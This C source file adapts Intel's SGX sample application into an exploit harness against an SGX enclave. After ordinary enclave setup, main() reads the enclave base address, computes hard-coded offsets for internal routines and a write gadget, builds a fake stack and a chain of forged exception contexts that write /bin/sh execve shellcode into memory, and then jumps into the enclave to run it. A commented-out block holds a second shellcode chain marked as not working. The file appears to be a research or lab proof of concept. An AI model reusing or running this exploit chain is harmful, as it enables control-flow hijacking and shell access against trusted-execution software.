/*
 * Copyright (C) 2011-2016 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>

# include <unistd.h>
# include <pwd.h>
# define MAX_PATH FILENAME_MAX

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
        printf("Error: Unexpected error occurred.\n");
}

/* Initialize the enclave:
 *   Step 1: try to retrieve the launch token saved by last transaction
 *   Step 2: call sgx_create_enclave to initialize an enclave instance
 *   Step 3: save the launch token if it is updated
 */
int initialize_enclave(void)
{
    char token_path[MAX_PATH] = {'\0'};
    sgx_launch_token_t token = {0};
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    int updated = 0;
    
    /* Step 1: try to retrieve the launch token saved by last transaction 
     *         if there is no token, then create a new one.
     */
    /* try to get the token saved in $HOME */
    const char *home_dir = getpwuid(getuid())->pw_dir;
    
    if (home_dir != NULL && 
        (strlen(home_dir)+strlen("/")+sizeof(TOKEN_FILENAME)+1) <= MAX_PATH) {
        /* compose the token path */
        strncpy(token_path, home_dir, strlen(home_dir));
        strncat(token_path, "/", strlen("/"));
        strncat(token_path, TOKEN_FILENAME, sizeof(TOKEN_FILENAME)+1);
    } else {
        /* if token path is too long or $HOME is NULL */
        strncpy(token_path, TOKEN_FILENAME, sizeof(TOKEN_FILENAME));
    }

    FILE *fp = fopen(token_path, "rb");
    if (fp == NULL && (fp = fopen(token_path, "wb")) == NULL) {
        printf("Warning: Failed to create/open the launch token file \"%s\".\n", token_path);
    }

    if (fp != NULL) {
        /* read the token from saved file */
        size_t read_num = fread(token, 1, sizeof(sgx_launch_token_t), fp);
        if (read_num != 0 && read_num != sizeof(sgx_launch_token_t)) {
            /* if token is invalid, clear the buffer */
            memset(&token, 0x0, sizeof(sgx_launch_token_t));
            printf("Warning: Invalid launch token read from \"%s\".\n", token_path);
        }
    }
    /* Step 2: call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        if (fp != NULL) fclose(fp);
        return -1;
    }

    /* Step 3: save the launch token if it is updated */
    if (updated == FALSE || fp == NULL) {
        /* if the token is not updated, or file handler is invalid, do not perform saving */
        if (fp != NULL) fclose(fp);
        return 0;
    }

    /* reopen the file with write capablity */
    fp = freopen(token_path, "wb", fp);
    if (fp == NULL) return 0;
    size_t write_num = fwrite(token, 1, sizeof(sgx_launch_token_t), fp);
    if (write_num != sizeof(sgx_launch_token_t))
        printf("Warning: Failed to save launch token to \"%s\".\n", token_path);
    fclose(fp);
    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("%s", str);
}
void getkey(){
    printf("The key is: Blah Blah Blah\n");
}

void initAttack(sgx_exception_info_t, unsigned long);
void testAttack(unsigned long);
/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
    (void)(argc);
    (void)(argv);

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }
    
    /* Utilize edger8r attributes */
    edger8r_array_attributes();
    edger8r_pointer_attributes();
    edger8r_type_attributes();
    edger8r_function_attributes();
    
    /* Utilize trusted libraries */
    ecall_libc_functions();
    ecall_libcxx_functions();
    ecall_thread_functions();

    printf("Give me the base address: ");
    unsigned long enclaveBaseAddr;
    unsigned long asmOretPos = 0x8c27;
    unsigned long continueExecutionPos =  0x8cfe;
    unsigned long secretPos = 0x4240;
    char buf[11];
    
    /* Enclave Base Address is Assumed to be known */
    scanf("%s", buf);
    enclaveBaseAddr = strtoll(buf, NULL, 16);

    /* Use already known position of asm_oret, continue_execution */
    unsigned long asmOret, continueExecution;
    asmOret = enclaveBaseAddr + asmOretPos;
    continueExecution = enclaveBaseAddr + continueExecutionPos;
    unsigned long fakeStack[100] = {0};
    unsigned long secret;
    secret = enclaveBaseAddr + secretPos;

    unsigned long overwriteBase = 0x401250;
    unsigned long writeGadget = 0x8ce5 + enclaveBaseAddr;


    /* Exception Context */
    sgx_exception_info_t ctx[50] = {0};


    printf("Received: %lx\n", enclaveBaseAddr);
    printf("asm_oret: %lx\n", asmOret);
    printf("continue_execution: %lx\n", continueExecution);
    printf("writeGadget: %lx\n", writeGadget);
    printf("fakeStack: %lx\n", fakeStack);
    printf("ctx: %lx\n", (unsigned long)&ctx[0]);

    /* Create Fake Stack Frame */
    for(int i = 0; i < 100; i++){
        fakeStack[i] = continueExecution;
    }
    int EXECUTE = 50;
    fakeStack[EXECUTE] = (unsigned long)fakeStack + (EXECUTE + 1)*8;
    // fakeStack[0] = 0x0000111100002222;
    // fakeStack[1] = 0x1234123412341234;
    // fakeStack[2] = 0x0000000000401469;
    // fakeStack[4] = 0x1557155715571557;
    
    
    // /* Test */
    // fe58426a
    // 529948c4
    // 622fbf48
    // 2f2f6e69
    // 54576873
    // d089495e
    // 0fd28949

//CONT LOOP
 //CODE INJECT USING WRITEGADGET (SHELL CODE example)
            // 6a 42                   push   0x42
            // 58                      pop    rax
            // fe c4                   inc    ah
            // 48 99                   cqo
            // 52                      push   rdx
            // 48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
            // 2f 73 68
            // 57                      push   rdi
            // 54                      push   rsp
            // 5e                      pop    rsi
            // 49 89 d0                mov    r8, rdx
            // 49 89 d2                mov    r10, rdx
            // 0f 05                   syscall
    int increm = 0;
    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0xfe58426a;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x529948c4;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x622fbf48;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x2f2f6e69;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x54576873;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0xd089495e;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x0fd28949;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rax = 0x00000005;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm++].cpu_context.rip = writeGadget;

    ctx[increm].cpu_context.rflags = 530;
    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[increm].cpu_context.rip = (unsigned long)fakeStack + (EXECUTE + 1)*8;


   /* 
   // SHELL CODE ON PAPER (but doesn't seem to assemble properly 
   //(enclu)<== enclave instruction so doesn't work without hardware) 
    ctx[0].cpu_context.rflags = 530;
    ctx[0].cpu_context.rax = 0xa4f35753;
    ctx[0].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8;
    ctx[0].cpu_context.rdi = (unsigned long)&ctx[1];
    ctx[0].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[0].cpu_context.rip = writeGadget;

    ctx[1].cpu_context.rflags = 530;
    ctx[1].cpu_context.rax = 0xc04f8d48;
    ctx[1].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4;
    ctx[1].cpu_context.rdi = (unsigned long)&ctx[2];
    ctx[1].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[1].cpu_context.rip = writeGadget;

    ctx[2].cpu_context.rflags = 530;
    ctx[2].cpu_context.rax = 0x00998d48;
    ctx[2].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 8;
    ctx[2].cpu_context.rdi = (unsigned long)&ctx[3];
    ctx[2].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[2].cpu_context.rip = writeGadget;

    ctx[3].cpu_context.rflags = 530;
    ctx[3].cpu_context.rax = 0x0ffffffe;
    ctx[3].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 12;
    ctx[3].cpu_context.rdi = (unsigned long)&ctx[4];
    ctx[3].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[3].cpu_context.rip = writeGadget;

    ctx[4].cpu_context.rflags = 530;
    ctx[4].cpu_context.rax = 0x665bd701;
    ctx[4].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 16;
    ctx[4].cpu_context.rdi = (unsigned long)&ctx[5];
    ctx[4].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[4].cpu_context.rip = writeGadget;

    ctx[5].cpu_context.rflags = 530;
    ctx[5].cpu_context.rax = 0x0102828b;
    ctx[5].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 20;
    ctx[5].cpu_context.rdi = (unsigned long)&ctx[6];
    ctx[5].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[5].cpu_context.rip = writeGadget;
    
    ctx[6].cpu_context.rflags = 530;
    ctx[6].cpu_context.rax = 0x89660000;
    ctx[6].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 24;
    ctx[6].cpu_context.rdi = (unsigned long)&ctx[7];
    ctx[6].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[6].cpu_context.rip = writeGadget;
    
    ctx[7].cpu_context.rflags = 530;
    ctx[7].cpu_context.rax = 0xf9c50443;
    ctx[7].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 28;
    ctx[7].cpu_context.rdi = (unsigned long)&ctx[8];
    ctx[7].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[7].cpu_context.rip = writeGadget;

    ctx[8].cpu_context.rflags = 530;
    ctx[8].cpu_context.rax = 0xfac5026f;
    ctx[8].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[8].cpu_context.rdi = (unsigned long)&ctx[9];
    ctx[8].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[8].cpu_context.rip = writeGadget;

    ctx[9].cpu_context.rflags = 530;
    ctx[9].cpu_context.rax = 0xc508437f;
    ctx[9].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[9].cpu_context.rdi = (unsigned long)&ctx[10];
    ctx[9].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[9].cpu_context.rip = writeGadget;

    ctx[10].cpu_context.rflags = 530;
    ctx[10].cpu_context.rax = 0x80826ffd;
    ctx[10].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[10].cpu_context.rdi = (unsigned long)&ctx[11];
    ctx[10].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[10].cpu_context.rip = writeGadget;

    ctx[11].cpu_context.rflags = 530;
    ctx[11].cpu_context.rax = 0xc5000001;
    ctx[11].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[11].cpu_context.rdi = (unsigned long)&ctx[12];
    ctx[11].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[11].cpu_context.rip = writeGadget;

    ctx[12].cpu_context.rflags = 530;
    ctx[12].cpu_context.rax = 0x28437ffe;
    ctx[12].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[12].cpu_context.rdi = (unsigned long)&ctx[13];
    ctx[12].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[12].cpu_context.rip = writeGadget;

    ctx[13].cpu_context.rflags = 530;
    ctx[13].cpu_context.rax = 0x01b05952;
    ctx[13].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[13].cpu_context.rdi = (unsigned long)&ctx[14];
    ctx[13].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[13].cpu_context.rip = writeGadget;

    ctx[14].cpu_context.rflags = 530;
    ctx[14].cpu_context.rax = 0x66d7010f;
    ctx[14].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[14].cpu_context.rdi = (unsigned long)&ctx[15];
    ctx[14].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[14].cpu_context.rip = writeGadget;

    ctx[15].cpu_context.rflags = 530;
    ctx[15].cpu_context.rax = 0xf3026f0f;
    ctx[15].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[15].cpu_context.rdi = (unsigned long)&ctx[16];
    ctx[15].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[15].cpu_context.rip = writeGadget;
    

    ctx[16].cpu_context.rflags = 530;
    ctx[16].cpu_context.rax = 0x00457f0f;
    ctx[16].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[16].cpu_context.rdi = (unsigned long)&ctx[17];
    ctx[16].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[16].cpu_context.rip = writeGadget;
    

    ctx[17].cpu_context.rflags = 530;
    ctx[17].cpu_context.rax = 0x0f04b05b;
    ctx[17].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[17].cpu_context.rdi = (unsigned long)&ctx[18];
    ctx[17].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[17].cpu_context.rip = writeGadget;
    

    ctx[18].cpu_context.rflags = 530;
    ctx[18].cpu_context.rax = 0x0000d701;
    ctx[18].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
    ctx[18].cpu_context.rdi = (unsigned long)&ctx[18];
    ctx[18].cpu_context.rsp = (unsigned long)fakeStack;
    ctx[18].cpu_context.rip = writeGadget;
     */
    //
    /* Execute Attack */
    // testAttack(secret);  //Test attack
    initAttack(ctx[0], continueExecution); 
    /* Destroy the enclave */
    printf("Attack has been executed awaiting to destroy enclave.\n");

    getchar();

    sgx_destroy_enclave(global_eid);
    
    printf("Info: SampleEnclave successfully returned.\n");

    printf("Enter a character before exit ...\n");
    
    getchar();
    printf("bye\n");
    return 0;
}
void testAttack(unsigned long addr){
    __asm__(
        "call %0\n"
        : //no out
        : "r" (addr)
    );
}

void initAttack(sgx_exception_info_t ctx, unsigned long addr){
    unsigned long tmp;
    tmp = (unsigned long)&ctx;
    printf("mov %lx, $rdi\ncall %lx\n", tmp, addr);
    __asm__(
        "mov %0, %%rdi\n"
        "call %1\n"
        : // no output
        : "r" (tmp), "r" (addr)
        : "rdi"
    );

    printf("The attack was complete\n");
}